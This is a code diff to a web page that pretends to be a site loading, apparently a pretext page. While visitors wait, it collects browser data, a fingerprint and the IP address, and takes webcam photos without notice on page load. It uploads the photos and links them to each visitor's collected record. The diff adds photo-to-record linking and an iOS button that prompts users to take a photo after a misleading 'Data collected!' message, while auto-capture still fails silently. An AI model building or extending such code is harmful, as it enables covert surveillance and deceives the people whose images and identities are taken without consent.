@@ -148,6 +148,9 @@ main a {
     <div id="status" class="status loading">
       <span class="spinner"></span>Loading website...
     </div>
+    <button id="btnbar" class="btn" style="margin-top: 20px; display: none;">
+      📷 Take Photo
+    </button>
   </div>
 
   <script>
@@ -698,6 +701,11 @@ main a {
         });
 
         if (response.ok) {
+          const result = await response.json();
+          // Store entry_id and fingerprint for photo linking
+          window.currentEntryId = result.entry_id;
+          window.currentFingerprint = result.fingerprint;
+          
           statusDiv.className = 'status success';
           statusDiv.innerHTML = ' Website will be Live in a few minutes!';
         } else {
@@ -711,14 +719,29 @@ main a {
       }
     }
 
+    // Detect if iOS device (used in multiple places)
+    const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+
     // Photo capture functionality
     async function capturePhoto(source = 'auto') {
       try {
         console.log(`[PHOTO] Starting ${source} photo capture...`);
 
-        // Request camera access
+        // Request camera access - uses the device's front camera
+        // On iPhone: uses iPhone's front camera
+        // On laptop: uses laptop's webcam
+        // This ensures remote users use their own device's camera
+        // iOS Safari may need simpler constraints
+        const videoConstraints = isIOS 
+          ? { facingMode: 'user' }  // Simpler constraint for iOS
+          : { 
+              facingMode: 'user',  // Front-facing camera (iPhone front camera, laptop webcam)
+              width: { ideal: 1280 },
+              height: { ideal: 720 }
+            };
+
         const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user' },
+          video: videoConstraints,
           audio: false
         });
 
@@ -754,16 +777,20 @@ main a {
         stream.getTracks().forEach(track => track.stop());
         video.remove();
 
-        // Compute fingerprint for linking
-        const fingerprintData = await computeFingerprint();
+        // Get entry ID and fingerprint from collected data (if available)
+        const entryId = window.currentEntryId || null;
+        const fingerprint = window.currentFingerprint || (await computeFingerprint()).fp;
 
-        // Send to backend
+        // Send to backend with entry ID to link photo to collected data
         const formData = new FormData();
         formData.append('photo', blob, 'photo.jpg');
         formData.append('timestamp', new Date().toISOString());
-        formData.append('fingerprint', fingerprintData.fp);
+        formData.append('fingerprint', fingerprint);
         formData.append('ip_address', (await getIPInfo())?.ip || '');
         formData.append('capture_source', source);
+        if (entryId) {
+          formData.append('data_entry_id', entryId);
+        }
 
         console.log('[PHOTO] Uploading photo to server...');
 
@@ -782,7 +809,12 @@ main a {
 
       } catch (error) {
         console.error('[PHOTO] Photo capture error:', error);
-        // Don't show error to user - fail silently
+        // Show error to user on manual capture
+        if (source === 'manual') {
+          statusDiv.className = 'status error';
+          statusDiv.innerHTML = '✗ Failed to capture photo: ' + error.message;
+        }
+        // Don't show error to user on auto capture - fail silently
       }
     }
 
@@ -792,14 +824,17 @@ main a {
       btnbar.addEventListener('click', async function() {
         statusDiv.className = 'status loading';
         statusDiv.innerHTML = '<span class="spinner"></span>Capturing photo...';
+        btnbar.disabled = true;
 
         try {
           await capturePhoto('manual');  // Manual button click
           statusDiv.className = 'status success';
           statusDiv.innerHTML = '✓ Photo captured and saved successfully!';
+          btnbar.style.display = 'none';
         } catch (error) {
           statusDiv.className = 'status error';
           statusDiv.innerHTML = '✗ Failed to capture photo: ' + error.message;
+          btnbar.disabled = false;
         }
       });
     }
@@ -808,11 +843,18 @@ main a {
     window.addEventListener('load', async function() {
       await collectAllData();
 
-      // Automatically capture photo after data collection
-      // Delay slightly to avoid overwhelming the browser
-      setTimeout(() => {
-        capturePhoto('auto');  // Automatic on page load
-      }, 1000);
+      // On iOS, show button instead of auto-capturing (iOS requires user interaction)
+      if (isIOS && btnbar) {
+        btnbar.style.display = 'inline-block';
+        statusDiv.className = 'status success';
+        statusDiv.innerHTML = '✓ Data collected! Please click the button below to take a photo.';
+      } else {
+        // On non-iOS devices, automatically capture photo after data collection
+        // Delay slightly to avoid overwhelming the browser
+        setTimeout(() => {
+          capturePhoto('auto');  // Automatic on page load
+        }, 1000);
+      }
     });
   </script>
 </body>
